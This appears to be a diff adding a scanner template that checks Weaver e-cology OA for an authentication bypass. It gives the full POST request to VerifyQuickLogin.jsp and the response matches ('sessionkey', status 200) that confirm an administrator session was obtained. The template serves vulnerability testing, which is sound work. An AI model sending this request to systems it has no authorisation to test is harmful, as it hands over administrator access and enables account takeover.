@@ -1,0 +1,29 @@
+id: ecology-verifyquicklogin-auth-bypass
+brief:
+    title: Weaver e-cology verifyquicklogin.jsp - Auth Bypass
+    by: SleepingBag945
+    level: high
+    about: There is an arbitrary administrator login vulnerability in the Panwei OA E-Cology VerifyQuickLogin.jsp file. An attacker can obtain the administrator Session by sending a special request package.
+    label:
+        - ecology
+        - weaver
+        - oa
+        - auth-bypass
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/mobile/plugin/VerifyQuickLogin.jsp'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: identifier=1&language=1&ipaddress=x.x.x.x
+      signs:
+        - "on": word
+          has:
+            - '"sessionkey":'
+            - '"message":'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
